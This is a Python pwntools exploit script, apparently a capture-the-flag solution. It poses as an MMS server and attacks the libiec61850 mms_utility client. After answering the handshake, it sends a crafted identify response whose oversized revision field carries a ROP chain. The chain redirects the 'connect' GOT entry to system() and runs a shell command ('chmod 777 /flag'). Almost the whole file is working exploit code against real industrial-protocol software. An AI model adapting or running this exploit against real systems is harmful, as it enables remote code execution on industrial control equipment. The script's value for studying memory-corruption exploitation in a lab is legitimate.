from pwn import *

context.arch="amd64"


# Arb Read: 0x000000000043169b : mov rax, qword ptr [rax + 0x58] ; ret
GADGET_READ_RAX_PLUS_0x58 = 0x000000000043169b
# Add:      0x0000000000406dc2 : add rax, rdx ; ret
GADGET_ADD_RAX_RDX = 0x0000000000406dc2

# mov rdi, r8. jmp rax
# 0x00000000004455b5 : mov rdi, r8 ; jmp rax
GADGET_MOV_RDI_R8_JMP_RAX = 0x00000000004455b5


def wrap_TPKT(data):
    return b"\x03\x00" + p16(len(data)+4, endian="big") + data 

def wrap_iso8073(data):
    return b"\x02\xf0\x80" + data 

def wrap_iso_0101(data):
    return b"\x01\x00\x01\x00" + data 


# from https://github.com/andrivet/python-asn1/blob/e25213a1e8fddfbadb97bd6a7b02a3ed515fe6e4/src/asn1.py#L275
def _emit_length( length):  # type: (int) -> None
    """Emit length octects."""
    if length < 128:
        return bytes([length])
    else:
        return _emit_length_long(length)

def _emit_length_long( length):  # type: (int) -> None
    """Emit the long length form (>= 128 octets)."""
    values = []
    while length:
        values.append(length & 0xff)
        length >>= 8
    values.reverse()
    # really for correctness as this should not happen anytime soon
    assert len(values) < 127
    head = bytes([0x80 | len(values)])
    ret = head
    for val in values:
        ret += bytes([val])
    return ret

def encode_tag_len_data(tag, data):
    return bytes([tag]) + _emit_length(len(data)) + data

l = listen(1337)
s = l.wait_for_connection()

# Send handshake response
s.recv(0x16)
s.send(b"\x03\x00\x00\x16\x11\xd0\x00\x01\x00\x01\x00\xc0\x01\x0d\xc2\x02\x00\x01\xc1\x02\x00\x01")

s.recv(1024)
s.send(b"\x03\x00\x00\x8f\x02\xf0\x80\x0e\x86\x05\x06\x13\x01\x00\x16\x01\x02\x14\x02\x00\x02\x34\x02\x00\x01\xc1\x74\x31\x72\xa0\x03\x80\x01\x01\xa2\x6b\x83\x04\x00\x00\x00\x01\xa5\x12\x30\x07\x80\x01\x00\x81\x02\x51\x01\x30\x07\x80\x01\x00\x81\x02\x51\x01\x61\x4f\x30\x4d\x02\x01\x01\xa0\x48\x61\x46\xa1\x07\x06\x05\x28\xca\x22\x02\x03\xa2\x03\x02\x01\x00\xa3\x05\xa1\x03\x02\x01\x00\xbe\x2f\x28\x2d\x02\x01\x03\xa0\x28\xa9\x26\x80\x03\x00\xfd\xe8\x81\x01\x05\x82\x01\x05\x83\x01\x0a\xa4\x16\x80\x01\x01\x81\x03\x05\xf1\x00\x82\x0c\x03\xee\x1c\x00\x00\x00\x02\x00\x00\x40\xed\x18")

s.recv(1024)
mms_utils_bin = ELF("/home/ctf/libiec61850/build/examples/mms_utility/mms_utility")
rop_chain = ROP(mms_utils_bin)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
libc.address = 0x00

rop_chain(rax=mms_utils_bin.got["connect"]-0x58, rdx=-libc.symbols["connect"]+libc.symbols["system"])
rop_chain.raw(GADGET_READ_RAX_PLUS_0x58)
rop_chain.raw(GADGET_ADD_RAX_RDX)
rop_chain.raw(GADGET_MOV_RDI_R8_JMP_RAX)

print(rop_chain.dump())

PAYLOAD_BUFFER = b""
full_mms_message = b""

COMMAND = b"chmod 777 /flag;"

invoke_id = encode_tag_len_data(0x02, b'\x01')
vendor_str = encode_tag_len_data(0x80, b'libiec61850.com')
model_str = encode_tag_len_data(0x81, b'LIBIEC61850')
rev_str = encode_tag_len_data(0x82, COMMAND.ljust(168, b'\x00')+bytes(rop_chain))

full_mms_message = encode_tag_len_data(0xa1, invoke_id + encode_tag_len_data(0xa2, vendor_str + model_str + rev_str))
PAYLOAD_BUFFER = encode_tag_len_data(0x61, b'\x30\x31' + encode_tag_len_data(0x02, b'\x03') + encode_tag_len_data(0xa0, full_mms_message))
PAYLOAD_BUFFER = wrap_iso_0101(PAYLOAD_BUFFER)
PAYLOAD_BUFFER = wrap_iso8073(PAYLOAD_BUFFER)
PAYLOAD_BUFFER = wrap_TPKT(PAYLOAD_BUFFER)

s.send(PAYLOAD_BUFFER)
print(hexdump(PAYLOAD_BUFFER))
s.interactive()
